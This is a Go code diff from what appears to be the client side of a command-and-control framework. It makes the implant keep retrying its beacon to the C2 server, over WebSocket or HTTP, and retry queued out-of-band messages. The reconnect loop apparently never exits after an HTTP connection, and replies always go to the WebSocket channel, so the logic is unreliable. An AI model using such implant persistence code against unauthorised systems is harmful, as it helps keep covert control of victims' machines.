@@ -2,6 +2,7 @@ package client
 
 import (
 	"strconv"
+	"time"
 
 	"github.com/dobin/antnium/pkg/arch"
 	"github.com/dobin/antnium/pkg/campaign"
@@ -9,16 +10,6 @@ import (
 
 	log "github.com/sirupsen/logrus"
 )
-
-/*
-if d.campaign.ClientUseWebsocket {
-	log.Info("UpstreamHttp: Use WS")
-	err := d.notifier.Connect()
-	if err != nil {
-		log.Warn(err.Error())
-	}
-}
-*/
 
 type UpstreamManager struct {
 	Channel chan model.Packet
@@ -46,62 +37,62 @@ func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) Upst
 
 // Connect will until the C2 can be reached. This is basically the client/entry of the actual Upstream
 func (d *UpstreamManager) Connect() error {
-	if d.campaign.ClientUseWebsocket {
-		// Try: Websocket
-		err := d.UpstreamWs.Connect()
-		if err != nil {
-			return err
-		}
-		d.UpstreamWs.Start()
-
-		// The Main Loop
-		var packet model.Packet
-		go func() {
-			for {
-				packet = <-d.UpstreamWs.ChanIncoming()
-				d.Channel <- packet
-
-				packet = <-d.Channel
-				d.UpstreamWs.ChanOutgoing() <- packet
+	// The Main Loop
+	var packet model.Packet
+	go func() {
+		for {
+			// We dont care which upstream we connected to
+			select {
+			case packet = <-d.UpstreamWs.ChanIncoming():
+			case packet = <-d.UpstreamHttp.ChanIncoming():
 			}
-		}()
 
-		d.sendPing() // AFTER the thread above
-	} else {
-		// Try: HTTP
-		err := d.UpstreamHttp.Connect()
-		if err != nil {
-			return err
+			d.Channel <- packet
+
+			packet = <-d.Channel
+			d.UpstreamWs.ChanOutgoing() <- packet
 		}
-		d.UpstreamHttp.Start()
+	}()
 
-		// The Main Loop
-		var packet model.Packet
-		go func() {
-			for {
-				packet = <-d.UpstreamHttp.ChanIncoming()
-				d.Channel <- packet
-
-				packet = <-d.Channel
-				d.UpstreamHttp.ChanOutgoing() <- packet
+	go func() {
+		for {
+			if d.campaign.ClientUseWebsocket {
+				// Try: Websocket
+				err := d.UpstreamWs.Connect()
+				if err == nil {
+					d.UpstreamWs.Start()
+					d.sendPing() // AFTER the thread above
+					break
+				}
 			}
-		}()
 
-		d.sendPing()
-	}
+			err := d.UpstreamHttp.Connect()
+			if err == nil {
+				d.UpstreamHttp.Start()
+				d.sendPing() // AFTER the thread above
+			}
 
-	// Wait
+			log.Info("Could not connect, sleeping...")
+			time.Sleep(time.Second * 3)
+
+		}
+	}()
 
 	return nil
 }
 
 func (d *UpstreamManager) SendOutofband(packet model.Packet) error {
-	if d.UpstreamWs.Connected() {
-		d.UpstreamWs.ChanOutgoing() <- packet
-	} else if d.UpstreamHttp.Connected() {
-		d.UpstreamHttp.ChanOutgoing() <- packet
-	} else {
-		log.Warn("OOB: No active upstreams, dont send")
+	for {
+		if d.UpstreamWs.Connected() {
+			d.UpstreamWs.ChanOutgoing() <- packet
+			break
+		} else if d.UpstreamHttp.Connected() {
+			d.UpstreamHttp.ChanOutgoing() <- packet
+			break
+		} else {
+			log.Warn("OOB: No active upstreams, sleep and try again")
+			time.Sleep(time.Second * 3)
+		}
 	}
 
 	return nil
